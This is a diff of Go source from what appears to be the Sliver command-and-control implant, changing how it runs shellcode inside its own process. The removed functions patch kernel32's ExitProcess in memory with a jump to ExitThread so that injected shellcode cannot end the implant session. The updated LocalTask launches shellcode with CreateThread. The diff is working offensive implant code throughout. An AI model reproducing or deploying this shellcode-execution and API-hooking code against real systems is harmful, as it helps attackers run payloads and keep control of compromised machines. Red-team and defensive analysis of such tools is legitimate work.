@@ -153,59 +153,6 @@ func RemoteTask(processID int, data []byte, rwxPages bool) error {
 	return nil
 }
 
-// placeHook hooks ExitProcess with ExitThread to prevent a locally injected
-// shellcode using ExitProcess to terminate our Sliver session
-func placeHook() (uintptr, []byte, error) {
-	var oldProtect uint32
-	modkernel32 := windows.NewLazySystemDLL("kernel32.dll")
-	procExitProcess := modkernel32.NewProc("ExitProcess")
-	procExitThread := modkernel32.NewProc("ExitThread")
-	err := windows.VirtualProtect(procExitProcess.Addr(), uintptr(0x512), windows.PAGE_EXECUTE_READWRITE, &oldProtect)
-	if err != nil {
-		//{{if .Debug}}
-		log.Println("VirtualProtect failed:", err)
-		//{{end}}
-		return uintptr(0), []byte{}, err
-	}
-	// {{if .Debug}}
-	log.Printf("Placing hook on ExitProcess\n")
-	// {{end}}
-	fun := *(*[16]byte)(unsafe.Pointer(procExitProcess.Addr()))
-	old := [16]byte{}
-	copy(old[:], fun[:])
-	var b []byte
-	var sane []byte
-	if runtime.GOARCH == "amd64" {
-		b = []byte{0x48, 0xb8} //mov rax
-		sane = make([]byte, 8) //64 bit
-		binary.LittleEndian.PutUint64(sane, uint64(procExitThread.Addr()))
-	} else {
-		b = []byte{0xb8}       //mov eax
-		sane = make([]byte, 4) //32 bit
-		binary.LittleEndian.PutUint32(sane, uint32(procExitThread.Addr()))
-	}
-	b = append(b, sane...)
-	b = append(b, []byte{0xff, 0xe0}...) //jmp rax
-	for i := uintptr(0); i < uintptr(len(b)); i++ {
-		loc := procExitProcess.Addr() + i
-		mem := (*[1]byte)(unsafe.Pointer(loc))
-		(*mem)[0] = b[i]
-	}
-	return procExitProcess.Addr(), old[:], nil
-}
-
-// removeHook removes the hook placed at addr with the content of old
-func removeHook(addr uintptr, old []byte) {
-	// {{if .Debug}}
-	log.Printf("Removing hook on ExitProcess\n")
-	// {{end}}
-	for i := uintptr(0); i < uintptr(len(old)); i++ {
-		loc := addr + i
-		mem := (*[1]byte)(unsafe.Pointer(loc))
-		(*mem)[0] = old[i]
-	}
-}
-
 func LocalTask(data []byte, rwxPages bool) error {
 	var err error
 	if runtime.GOARCH == "amd64" {
@@ -234,22 +181,12 @@ func LocalTask(data []byte, rwxPages bool) error {
 	log.Printf("creating local thread with start address: 0x%08x", addr)
 	// {{end}}
 	var lpThreadId uint32
-	exitProc, oldCode, err := placeHook()
+	_, err = syscalls.CreateThread(nil, 0, addr, uintptr(0), 0, &lpThreadId)
 	if err != nil {
 		// {{if .Debug}}
-		log.Printf("placeHook failed")
+		log.Printf("CreateThread failed: %v\n", err)
 		// {{end}}
-		return err
 	}
-	hThread, err := syscalls.CreateThread(nil, 0, addr, uintptr(0), 0, &lpThreadId)
-	_, err = windows.WaitForSingleObject(hThread, windows.INFINITE)
-	if err != nil {
-		// {{if .Debug}}
-		log.Printf("WaitForSingleObject failed with: %v\n", err)
-		// {{end}}
-		return err
-	}
-	removeHook(exitProc, oldCode)
 	return err
 }
 
